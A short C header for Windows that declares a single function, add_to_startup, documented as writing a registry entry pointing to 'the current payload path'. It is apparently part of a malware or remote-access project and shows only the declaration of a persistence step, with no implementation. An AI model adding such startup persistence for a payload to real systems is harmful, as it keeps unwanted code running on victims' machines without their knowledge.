#pragma once

#include <Windows.h>

/*
 * add_to_startup - Creates a registry entry and sets its value to the current
 * payload path.
 *
 * Returns zero if successful. On error, returns a non-zero error code.
 */
LONG add_to_startup();
